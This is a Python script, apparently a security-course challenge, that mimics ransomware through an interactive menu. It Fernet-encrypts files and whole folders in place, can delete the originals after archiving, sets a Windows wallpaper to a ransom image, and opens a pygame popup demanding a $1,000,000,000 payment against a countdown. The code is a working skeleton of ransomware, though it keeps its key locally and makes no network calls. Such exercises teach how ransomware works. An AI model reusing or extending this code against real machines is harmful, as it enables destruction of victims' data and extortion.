#!/usr/bin/python3

# Script : OpsChallenge08.py
# Purpose: Prompts the user to select if he/she want to encrpt/decrypt a file/string/folder; change wallpaper desktop of a windows PC; popup window on a Windows PC with a ransomware message 
# Why    : 

from cryptography.fernet import Fernet
import os
import tarfile
import datetime
from tqdm import tqdm
import ctypes
from tkinter import messagebox
import pygame
import time

ENCRYPT              = 0
DECRYPT              = 1
# WALLPAPER_PATH     = r"C:\Users\35193\Documents\ransom.png"
WALLPAPER_PATH       = "ransom2.png" 
SPI_SETDESKWALLPAPER = 20

# window dimensions
WINDOW_WIDTH  = 1000
WINDOW_HEIGHT = 800

# colors
WHITE  = (255, 255, 255)
BLACK  = (0, 0, 0)
RED    = (255, 0, 0)
YELLOW = (255,255,0)

# countdown
COUNTDOWN = 10000000


### funtions
# Function name: write_key
# Purpose      : Generates a key that will be used to encrypt and decrypt and save it to a file. Symmetric cryptography.
# Arguments    : none
# Return       : none
def write_key():
    key = Fernet.generate_key()
    with open("key","wb") as key_file:
        key_file.write(key)

# Function name: load_key
# Purpose      : Loads the key saved in a file
# Arguments    : none
# Return       : The key read from the file
def load_key():
    return open("key","rb").read()

# Function name: get_key
# Purpose      : get the key
# Arguments    : none
# Return       : The key returned by load_key() function
def get_key():
    try:
        return load_key()
    except FileNotFoundError:
        write_key()
        return load_key()
    except:
        print("\n ----- An unexpected error occured during a load key -----\n")

# Function name: want_to_compress
# Purpose      : Asks the user if he/she/other want to compress
# Arguments    : file_path
# Return       : none
def want_to_compress(file_path):
    user_answer = input("\nDo you want to compressed the file to an archive? (y/n)\n")
    if user_answer.lower() == 'y':
        return True


# Function name: encrypt_file
# Purpose      : Encrypts a file
# Arguments    : file_path, fernet
# Return       : none
def encrypt_file(file_path, fernet):
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            plaintext = file.read()

        ciphertext = fernet.encrypt(plaintext)

        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(ciphertext)
            if want_to_compress(encrypted_file):
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H:%M:%S.%f')
                compress(f"compressed_{timestamp}.tar.gz",[file_path])
                os.system(f"rm {file_path}")
    else:
        print(f"The file {file_path} does not exists")

# Function name: decrypt_file
# Purpose      : Decrypts a file
# Arguments    : file_path, fernet
# Return       : none
def decrypt_file(file_path, fernet):
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            ciphertext = file.read()

        plaintext = fernet.decrypt(ciphertext)

        with open(file_path, 'wb') as plaintext_file:
            plaintext_file.write(plaintext)
    else:
        print(f"The file {file_path} does not exists")

# Function name: encrypt_string
# Purpose      : Encrypts a string and print to the standard output the ciphertext
# Arguments    : string, fernet
# Return       : none
def encrypt_string(string,fernet):
    encoded_string   = string.encode()
    encrypted_string = fernet.encrypt(encoded_string).decode()
    print(f"\nCiphertext: {encrypted_string}\n")

# Function name: decrypt_string
# Purpose      : Decrypts a string and print to the standard output the plaintext
# Arguments    : string, fernet
# Return       : none
def decrypt_string(string,fernet):
    decrypted_string = fernet.decrypt(string.encode()).decode()
    print(f"\nPlaintext: {decrypted_string}\n")
    
# Function name: encrypt_decrypt_folder
# Purpose      : Encrypts and decrypts a folder
# Arguments    : folder_path, fernet, value
# Return       : none   
def encrypt_decrypt_folder(folder_path,fernet,value):
    if value == ENCRYPT:
        for (root, dirs, files) in os.walk(folder_path, topdown=True):
            for filename in files:
                file_path = os.path.join(root,filename)

                encrypt_file(file_path,fernet)

    if value == DECRYPT:
        for (root, dirs, files) in os.walk(folder_path, topdown=True):
            for filename in files:
                file_path = os.path.join(root,filename)

                decrypt_file(file_path,fernet)

                
# Function name: alter_desktop_wallpaper
# Purpose      : alter desktop wallpaper of a windows PC
# Arguments    : none
# Return       : none  
# it would be more correctly if I have an argument that specifiy the path to the picture; it was just a matter of simplicity
def alter_desktop_wallpaper():
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 0)

# Function name: message_box
# Purpose      : create a message box 
# Arguments    : message, letter_color, background_color, font_size, width_location, height_location
# Return       : none  
def message_box(window_surface, message,letter_color,background_color,font_size,width_location,height_location):
    # Create a message box with text
    # Set the font and size for the message box
    font = pygame.font.Font(None, font_size)
    message_box = font.render(message, True, letter_color, background_color)
    message_box_rect = message_box.get_rect(center=(width_location, height_location))
    window_surface.blit(message_box, message_box_rect)


# Function name: image
# Purpose      : load an image and draw the image on the window surface
# Arguments    : window_surface, image, width_location, height_location
# Return       : none 
def image(window_surface, image,width_location,height_location):
    # Load image
    image = pygame.image.load('ransom2.png')

    # Get image dimensions
    image_rect = image.get_rect(center=(width_location,height_location))
    
    # Draw image on the window surface
    window_surface.blit(image, image_rect)

# Function name: update_time_message
# Purpose      : update the time that will be displayed on the window surface
# Arguments    : window_surface, hours, minutes, seconds, letter_color
# Return       : none 
def update_time_message(window_surface,hours,minutes,seconds,letter_color):
        # Define the text time with time left information
    time_lines = [
        "Payment of 1,000,000,000.00$ will be raised on",
        "01/05/2023",
        "Time left",
        "{} hours, {} minutes, {} seconds".format(hours, minutes, seconds)
    ]
    
    pygame.draw.rect(window_surface, RED, (0, 450, WINDOW_WIDTH, 600))
    
    # Render each line of the text message with the font
    fonts = [pygame.font.Font(None, 36), pygame.font.Font(None, 36), pygame.font.Font(None, 28), pygame.font.Font(None, 28)]
    text_surfaces = [font.render(line, True, letter_color) for font, line in zip(fonts, time_lines)]

    # Get the rectangles for each text surface and center them horizontally in the window
    text_rects = [surface.get_rect(center=(WINDOW_WIDTH/2, 500+50*i)) for i, surface in enumerate(text_surfaces)]


    # Blit each text surface onto the window surface
    for surface, rect in zip(text_surfaces, text_rects):
        window_surface.blit(surface, rect)

# Function name: ransomware_popup
# Purpose      : popup a ransomware window
# Arguments    : none
# Return       : none 
def ransomware_popup():
    # Initialize Pygame
    pygame.init()

    # Create a surface for the window
    window_surface = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))

    # Set the window title
    pygame.display.set_caption('Ransomware Window')

    # Fill the background color
    window_surface.fill(RED)

    # Set the time for the countdown
    countdown_time = COUNTDOWN

    # Set the start time for the countdown
    start_time = time.time()

    message_box(window_surface,'(: !!!! YOU GOT RANSOM !!!! :)',BLACK,RED,48,WINDOW_WIDTH/2,30)
    image(window_surface,'ransom2.png',WINDOW_WIDTH/2,260)

    # Run the game loop
    while True:
        # Check for events
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                # Quit the game
                pygame.quit()
                quit()

        # Calculate the time remaining for the countdown
        time_remaining = countdown_time - int(time.time() - start_time)
        hours = time_remaining // 3600
        minutes = (time_remaining % 3600) // 60
        seconds = time_remaining % 60

        update_time_message(window_surface, hours,minutes,seconds,BLACK)

        # Update the display
        pygame.display.update()


########## Functions from https://www.thepythoncode.com/article/compress-decompress-files-tarfile-python ############
def compress(tar_file, members):
    """
    Adds files ('members') to a tar_file and compress it
    """

    # open file for gzip compressed writing
    tar = tarfile.open(tar_file, mode="w:gz")

    # with progress bar
    # set the progress bar
    progress = tqdm(members)
    for member in progress:
        # add file/folder/link to the tar file (compress)
        tar.add(member)
        # set the progress description of the progress bar
        progress.set_description(f"Compressing {member}")

    # close the file
    tar.close()

# this funtion is not used in this script
def decompress(tar_file, path, members=None):
    """
    Extracts 'tar_file' and puts the 'members' to 'path'
    If members is None, all members on 'tar_file' will be extracted
    """

    tar = tarfile.open(tar_file, mode="r:gz")
    if members is None:
        members = tar.getmembers()

    # with progress bar
    # set the progress bar
    progress = tqdm(members)
    for member in progress:
        tar.extract(member, path=path)
        # set the progress description of the progress bar
        progress.set_description(f"Extracting {member.name}")

    # or use this
    # tar.extractall(members=members, path=path)
    # close the file
    tar.close()
#####################################################################################################################
        
# main

# initialize the Fernet class
fernet = Fernet(get_key())

while(True):

    print("Mode 1 - Encrypt a file")
    print("Mode 2 - Decrypt a file")
    print("Mode 3 - Encrypt a message")
    print("Mode 4 - Decrypt a message")
    print("Mode 5 - Encrypt a folder")
    print("Mode 6 - Decrypt a folder")
    print("Mode 7 - Alter the desktop wallpaper on a Windows PC with a ransomware message")
    print("Mode 8 - Create a popup window on a Windows PC with a ransomware message")
    print("Enter 'q' to quit\n")
    user_input = input("Enter one of the modes listed above: (1,2,3, or 4)\n\n>")

    match(user_input):

        case "1":
            file_path  = input("\nFile Path: ")
            print("")
            encrypt_file(file_path,fernet)

        case "2":
            file_path  = input("\nFile Path: ")
            print("")
            try:
                decrypt_file(file_path,fernet)
            except:
                print(f"\n ----- Check the file {file_path}. It is probably already decrypted. -----\n")

        case "3":
            plaintext  = input("\nEnter a plaintext string: ")
            print("")
            encrypt_string(plaintext,fernet)

        case "4":
            ciphertext = input("\nEnter a ciphertext string: ")
            print("")
            decrypt_string(ciphertext,fernet)
        
        case "5":
            folder_plaintext = input("\nEnter the folder to encrypt: ")
            encrypt_decrypt_folder(folder_plaintext,fernet,ENCRYPT)

        case "6":
            folder_ciphertext = input("\nEnter the folder to decrypt: ")
            encrypt_decrypt_folder(folder_ciphertext,fernet,DECRYPT)
       
        case "7":
            alter_desktop_wallpaper()
        
        case "8":
            #messagebox.showinfo("Ransom ALERT", "You've been hacked")
            ransomware_popup()
        case "q":
            break

        case _:
            print("\n ----- You do not entered a correct option. Try again -----\n")
            

### REFERENCES
# https://www.geeksforgeeks.org/encrypt-and-decrypt-files-using-python/
# https://www.thepythoncode.com/article/encrypt-decrypt-files-symmetric-python
# https://www.devdungeon.com/content/dialog-boxes-python
